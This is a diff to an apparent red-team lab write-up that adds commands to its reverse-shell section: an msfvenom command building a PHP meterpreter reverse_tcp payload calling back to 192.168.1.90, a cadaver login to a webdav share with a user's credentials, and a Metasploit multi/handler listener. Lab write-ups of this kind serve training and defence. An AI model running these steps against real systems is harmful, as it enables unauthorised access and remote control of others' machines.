@@ -155,17 +155,36 @@ We could then login to webdav using Ryan&#39;s credentials.
 
 ### **Reverse Shell:**
 
+#### **Msfvenom**
+
+```
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php
+```
+
 The next task was to upload a shell script to webdav, in order to create a reverse shell.
 
 Using msfvenom we created a payload – shell.php
 
 ![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture26.png)
 
-Using cadaver and Ryan&#39;s credentials we accessed webdav, and uploaded the payload to the webdav directory.
+#### **Cadaver**
+
+```
+cadaver http://192.168.1.105/webdav
+```
+
+Using cadaver and Ryan's credentials we accessed webdav, and uploaded the payload to the webdav directory.
 
 ![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture27.png)
 
 ![alt-text](https://github.com/SamGeron/Red-Team-vs-Blue-Team/blob/main/images/Picture28.png)
+
+#### **Metasploit**
+
+```
+msfconsole
+use multi/handler
+```
 
 Once the payload was successfully uploaded, in order to create the reverse shell, we setup a listener using Metasploit.
 
